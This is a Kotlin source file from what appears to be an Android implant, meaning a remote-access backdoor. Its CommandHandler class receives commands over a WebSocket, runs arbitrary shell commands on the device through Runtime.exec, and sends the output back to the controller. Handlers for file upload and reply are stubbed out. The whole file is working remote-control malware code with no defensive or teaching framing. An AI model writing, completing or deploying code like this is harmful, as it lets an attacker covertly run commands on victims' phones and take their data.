package com.cooperthecoder.implant.command

import android.util.Log
import com.cooperthecoder.implant.model.Command
import okhttp3.WebSocket
import java.io.BufferedReader
import java.io.InputStreamReader

class CommandHandler(val command: Command, val socket: WebSocket) {
    fun handle() {
        when (command.command) {
            CommandListener.EXECUTE -> {
                val shellCommand = command.arguments.get("shell_command")
                if (shellCommand != null) {
                    handleExecute(shellCommand)
                }
            }

            CommandListener.REPLY -> {
                val nonce = command.arguments.get("nonce")
                val output = command.arguments.get("output")
                if (nonce != null && output != null) {
                    handleReply(nonce, output)
                }
            }

            CommandListener.UPLOAD -> {
                val filename = command.arguments.get("filename")
                if (filename != null) {
                    handleUpload(filename)
                }
            }
        }
    }

    private fun handleExecute(shellCommand: String) {
        Log.d(CommandListener.TAG, "Executing: $shellCommand")
        val process = try {
            Runtime.getRuntime().exec(shellCommand)
        } catch (e: Exception) {
            Log.e(CommandListener.TAG, "Error running command", e)
            return
        }
        process.waitFor()

        val reader = BufferedReader(InputStreamReader(process.inputStream))
        val outputBuffer = StringBuffer()
        reader.forEachLine {
            outputBuffer.append(it)
        }
        val output = outputBuffer.toString()
        reply(output)
        Log.d(CommandListener.TAG, "Output is: $outputBuffer")
    }

    private fun handleUpload(filename: String) {

    }

    private fun handleReply(nonce: String, output: String) {

    }

    private fun reply(output: String) {
        val arguments = hashMapOf(
                "nonce" to command.nonce,
                "output" to output
        )
        val command = Command.Builder()
                .command(CommandListener.REPLY)
                .arguments(arguments)
                .build()

        socket.send(command.json())
    }
}